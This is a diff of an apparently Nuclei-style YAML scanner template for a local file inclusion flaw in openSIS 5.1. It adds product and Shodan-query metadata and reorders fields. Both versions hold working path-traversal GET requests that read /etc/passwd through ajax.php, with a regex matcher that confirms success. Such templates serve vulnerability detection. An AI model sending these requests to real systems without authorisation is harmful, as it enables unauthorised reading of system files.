@@ -1,5 +1,4 @@
 id: opensis-lfi
-
 info:
   name: openSIS 5.1 - Local File Inclusion
   author: pikpikcu
@@ -14,22 +13,20 @@ info:
     cpe: cpe:2.3:a:os4ed:opensis:*:*:*:*:*:*:*:*
   metadata:
     max-request: 2
+    product: opensis
+    shodan-query: http.title:"openSIS"
     vendor: os4ed
-  tags: opensis,lfi,edb,vuln
-
+  tags: edb,lfi,opensis,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php"
-      - "{{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
+      - '{{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
